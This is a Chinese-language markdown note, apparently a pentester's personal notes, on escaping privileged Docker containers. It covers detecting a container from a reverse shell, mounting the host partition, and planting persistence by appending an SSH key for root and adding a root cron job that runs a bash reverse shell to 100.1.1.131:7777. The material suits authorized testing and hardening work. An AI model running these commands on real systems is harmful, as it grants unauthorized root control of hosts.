# Docker

- [Docker](#docker)
  - [Docker逃逸](#docker逃逸)
    - [反弹 shell 中如何判断自己是否在 docker 容器中](#反弹-shell-中如何判断自己是否在-docker-容器中)
    - [特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)](#特权容器逃逸反弹shell到特权模式的docker容器后进一步获取宿主机权限)
        - [写公钥](#写公钥)
        - [写定时任务](#写定时任务)

---

## Docker逃逸


### 反弹 shell 中如何判断自己是否在 docker 容器中

- 看当前反弹 shell 的主机名称, 一堆数字字母的则可能是 docker 容器 id

  ![image-20230619000402010](http://cdn.ayusummer233.top/DailyNotes/202306190004059.png)

- 查看根目录下有没有 `.dockerenv` 文件, 如果有的话则可能在 docker 环境中

  ```bash
  ls -alh /.dockerenv
  ```

  ![image-20230618230722588](http://cdn.ayusummer233.top/DailyNotes/202306182307643.png)

----


### 特权容器逃逸(反弹shell到特权模式的docker容器后进一步获取宿主机权限)

在判断当前反弹shell位置为docker后可以尝试查看下系统中的所有银盘分区表信息

```bash
fdisk -l
```

如果没有输出则不是特权模式启动的 Docker 容器

![image-20230619095827529](http://cdn.ayusummer233.top/DailyNotes/202306190958112.png)

如果有输出则可以观察 Device 了

![image-20230619100109506](http://cdn.ayusummer233.top/DailyNotes/202306191001591.png)

![image-20230619100145688](http://cdn.ayusummer233.top/DailyNotes/202306191001794.png)

上图Type 为 Linux 的这条即为宿主机的系统分区

> 遇到过宿主是实体机固态装系统+一块机械时, 特权容器启动的 docker 能看到机械硬盘所在的分区, 系统分区显示的 ` /dev/nvme0n1p1` 和 ` /dev/nvme0n1p2`, 一个 PE 一个 LinuxVM 似乎(也许不是 LinuxVM, 不过一定不是LINUX, TODO: 记得确认下), 此时只能再用 `lvdisplay` 找逻辑卷, 不过这条命令 Docker 容器中不一定有

看到系统分区后可以在容器中新建一个目录然后挂载该分区

```bash
mkdir /joker
mount /dev/sda5 /joker
```

![image-20230619101649612](http://cdn.ayusummer233.top/DailyNotes/202306191016670.png)

----

##### 写公钥

可以尝试写 root 账户的公钥

![image-20230619102252795](http://cdn.ayusummer233.top/DailyNotes/202306191022850.png)

在本机新建一对密钥

```bash
ssh-keygen -t rsa -C "xxl-job"
```

> `-C(comment)` 随便填, 有辨识度就行

在命令执行的交互中可以设置密钥存放的路径, 然后根据回显找到 `.pub` 公钥

![image-20230619102802288](http://cdn.ayusummer233.top/DailyNotes/202306191028353.png)

然后直接用 `echo >>` 来续写即可

![image-20230619102953093](http://cdn.ayusummer233.top/DailyNotes/202306191029155.png)

然后就可以 cat 看下了, 顺利的话已经写进去了

![image-20230619103048603](http://cdn.ayusummer233.top/DailyNotes/202306191030673.png)

然后可以直接 ssh 连接到宿主机了

```bash
ssh -i id_rsa root@xxx
```

![image-20230619103459517](http://cdn.ayusummer233.top/DailyNotes/202306191034575.png)

---

##### 写定时任务


ubuntu 默认没有 MTA, 因此执行定时任务可能会报这样的错:

![image-20230626075128404](http://cdn.ayusummer233.top/DailyNotes/202306260751798.png)

所以需要在定时任务中第一行写上 `MAILTO=""` 以禁用邮件输出

此外直接写 `bash -i >& /dev/tcp/100.1.1.131/7777  0>&1` 到定时任务中不一定行得通, 可以写个脚本, 然后定时任务调脚本执行, 比如:

`test.sh`:

```sh
#!/bin/bash
bash -i >& /dev/tcp/100.1.1.131/7777  0>&1
```

`/var/spool/cron/crontabs/root`:

```
MAILTO=""
* * * * * /bin/bash test.sh
```

---
